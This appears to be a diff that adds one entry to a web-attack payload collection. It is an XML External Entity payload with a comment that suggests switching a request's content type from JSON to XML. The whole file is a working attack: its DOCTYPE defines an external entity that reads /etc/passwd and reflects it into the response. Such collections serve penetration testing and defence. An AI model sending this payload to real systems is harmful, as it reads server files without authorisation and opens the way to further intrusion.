@@ -1,0 +1,10 @@
+<!--
+Payload: Content-Type Switch (JSON to XML)
+Usage: Changing Content-Type: application/json to Content-Type: application/xml or text/xml
+Note: Not a payload file itself, but a concept to use in requests.
+-->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<root>
+    <foo>&xxe;</foo>
+</root>
